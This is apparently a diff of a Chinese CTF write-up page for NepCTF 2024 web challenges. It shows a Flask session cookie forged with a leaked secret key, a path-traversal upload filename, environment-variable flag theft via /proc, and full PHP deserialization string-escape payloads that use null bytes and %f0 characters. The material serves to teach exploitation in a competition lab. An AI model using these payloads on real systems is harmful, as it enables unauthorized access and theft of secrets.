+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">app.secret_key</span> = <span class="hljs-string">&quot;super_secret_key&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>这就是key，y1s1我真的服了。</p>
 <p>然后利用flask_session_cookie_manager3.py伪造jwt</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\flask_session_cookie_manager3.py encode -s &quot;super_secret_key&quot; -t &quot;&#123;&#x27;username&#x27;:&#x27;admin&#x27;,&#x27;admin_logged_in&#x27;:True&#125;&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">python .\flask_session_cookie_manager3.py encode -s <span class="hljs-string">&quot;super_secret_key&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;</span>username&#x27;:<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin_logged_in&#x27;</span>:True&#125;<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>得到admin的session：eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW5fbG9nZ2VkX2luIjp0cnVlfQ.ZsrqeQ.67ozPrRCkESW85eLT_z39M3RAY4</p>
 <p>打入cookie之后就可以进&#x2F;admin&#x2F;dashboard了。</p>
 <p>这里传入cmd参数就可以执行命令，但是有个前提条件，是当前目录要有lock.txt。然后旁边还有个文件上传的地方，我们这里就需要上传一个lock.txt到当前目录下。</p>
 <p>但是默认上传路径是<code>templates/uploads/</code>，由于这里没有对文件名进行任何过滤，我们可以通过目录穿越的方式把文件传到当前目录。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;../../lock.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;../../lock.txt&quot;<br>Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain<br><br>aaa<br></code></pre></td></tr></table></figure>
 
 <p>传入的文件名为<code>../../lock.txt</code>系统就会把lock.txt放到当前目录了。</p>
 <p>然后开始执行命令，这里flag是没有权限读取的。</p>
 <p>故意输入错误命令，令其报错：</p>
-<p><img src="/img/nepctf2024/QQ_1724584341924.png" alt="QQ_1724584341924"></p>
+<p><img src="/img/nepctf2024/QQ_1724584341924.png" srcset="/img/loading.gif" lazyload alt="QQ_1724584341924"></p>
 <p>注意到程序在我们输入的命令前方还拼接了一条GZCTF_FLAG&#x3D;0，这里也就是清理了环境变量里的flag。</p>
 <p>那是不是说明在环境启动的之后，在这条命令执行之前，flag是确确实实存在过环境变量里的呢？</p>
 <p>答案是肯定的，所以我们输入ps命令查看进程启动情况。</p>
 <p>然后cat &#x2F;proc&#x2F;21&#x2F;environ里找到了flag</p>
-<p><img src="/img/nepctf2024/fbb3acf286069218f8fd5be04668cb8f.png" alt="fbb3acf286069218f8fd5be04668cb8f"></p>
+<p><img src="/img/nepctf2024/fbb3acf286069218f8fd5be04668cb8f.png" srcset="/img/loading.gif" lazyload alt="fbb3acf286069218f8fd5be04668cb8f"></p>
 <h1 id="PHP-MASTER"><a href="#PHP-MASTER" class="headerlink" title="PHP_MASTER!!"></a>PHP_MASTER!!</h1><p>基本是做过的很类似的题</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>( <span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key=== <span class="string">&quot;\0key\0&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">            <span class="variable">$contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>, <span class="variable">$contents</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nep1&#x27;</span>].<span class="string">&quot;[welcome to&quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>].<span class="string">&quot;CTF]&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$str</span>===<span class="string">&#x27;NepCTF]&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b) ();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt;str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]));</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;\0&quot;</span>,<span class="string">&quot;00&quot;</span>,<span class="variable">$ser</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>( <span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key=== <span class="hljs-string">&quot;\0key\0&quot;</span>)&#123;<br>            <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>);<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$contents</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep1&#x27;</span>].<span class="hljs-string">&quot;[welcome to&quot;</span>. <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>].<span class="hljs-string">&quot;CTF]&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$str</span>===<span class="hljs-string">&#x27;NepCTF]&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;b) ();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;s = <span class="hljs-variable">$s</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span> -&gt;str;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]));<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-string">&quot;00&quot;</span>,<span class="hljs-variable">$ser</span>);<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure>
 
 <p>这道题的A::readflag()方法是没用的，这里读不到flag。而B类最后的<code>return ($this-&gt;b) ();</code>倒是可以执行任意无参方法。这里可以执行phpinfo，flag就在环境变量里。</p>
 <p>C类的<code>echo $this -&gt;str;</code>可以触发B类的<code>__tostring()</code></p>
 <p>这里我们可控的只有C类的$s，而我们想要$str成为B类的一个实例化对象。这里序列化之后的$ser会进去一个replace，\0会变成00，也就是我们传入%00（这是一个字符）,会变成00（两个字符）。可以尝试用字符串逃逸的方法达到效果。</p>
 <p>我们需要的序列化字符串：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;C&quot;:2:&#123;s:1:&quot;s&quot;;s:1:&quot;a&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;N;&#125;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>注意我们可控的s后面的部分：<code>&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;N;&#125;&#125;</code>这就是我们需要逃逸的部分，一个%00可以逃逸一个字符，而我们需要逃逸35个字符，就需要35个<code>%00</code></p>
 <p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;N;&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
 <p>这样就可以到B类的<code>__tostring()</code>方法了。</p>
 <p>同样的，我们还需要让B类的$b变成phpinfo，照猫画虎，我们需要逃逸的部分是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&quot;;s:3:&quot;</span>st<span class="hljs-string">r&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span><span class="hljs-string">b&quot;;s:7:&quot;</span>phpinfo<span class="hljs-string">&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
 <p>一共47个字符，那么我们就需要47个%00</p>
 <p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>b<span class="hljs-string">&quot;;s:7:&quot;</span>phpinfo<span class="hljs-string">&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nep1&#x27;</span>].<span class="string">&quot;[welcome to&quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>].<span class="string">&quot;CTF]&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$str</span>===<span class="string">&#x27;NepCTF]&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b) ();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep1&#x27;</span>].<span class="hljs-string">&quot;[welcome to&quot;</span>. <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nep&#x27;</span>].<span class="hljs-string">&quot;CTF]&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$str</span>===<span class="hljs-string">&#x27;NepCTF]&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;b) ();<br>        &#125;<br></code></pre></td></tr></table></figure>
 
 <p>关于这里面的逃逸，大家可以去看 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/p/18310518">https://www.cnblogs.com/EddieMurphy-blogs/p/18310518</a></p>
 <p>这里不再赘述了。主要是注意一下%f0吞字符的取整。</p>
 <p>总payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;&amp;nep1=%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0&amp;nep=NepCTNep</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/nepctf2024/QQ_1724743182982.png" alt="QQ_1724743182982"></p>
-	
-		</div>
-		
-		<div id="current-post-cover" data-scr="/img/nepctf2024/nepctf2024.png"></div>
-
-		<!-- relate post, comment...-->
-		<div class="investment-container">
-			<div class="investment-header">
-				<div class="investment-title-1">
-					<div class="on">相关文章</div>
-					<div>评论</div>
-					<div>分享</div>
-				</div>
-				<div class="investment-title-2">	            
-					
-	<span>
-		<a id="totop-post-page">返回顶部</a>
-		
-			<a href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解" rel="prev">
-				&laquo;上一篇
-			</a>
-		
-		
-			<a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp" rel="next">
-				下一篇&raquo;
-			</a>
-			
-	</span>
-
-
-      		
-				</div>	
-			</div>
-			
-			<div class="investment-content">
-				<div class="investment-content-list">
-					
-
-<div class="relate-post">
-	
-		<ul>
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2025/01/18/xhlj8/" title="第八届西湖论剑初赛web全题解">
-								第八届西湖论剑初赛web全题解			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								一月 18日, 2025				
-							</p>
-							<p class="relate-post-content">
-								Rank-l
-可能是ssti，过滤了一些东西，如果触发过滤，输入密码的页面会直接302
-过滤了空格，用request.args.aaa可以参数逃逸。
-1phone_number=&#123;&#123;url_for.__global...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2025/01/18/xhlj8/" title="第八届西湖论剑初赛web全题解">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/xhlj8/XHLJ8.png" alt="第八届西湖论剑初赛web全题解"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp">
-								SUCTF 2025 WEB部分wp			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								一月 14日, 2025				
-							</p>
-							<p class="relate-post-content">
-								SU_photogallery
-尝试源码泄露 https://www.cnblogs.com/Kawakaze777/p/17799235.html![e0dcf5e1-a150-4c37-bd6e-bf45ea40a99b](img...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
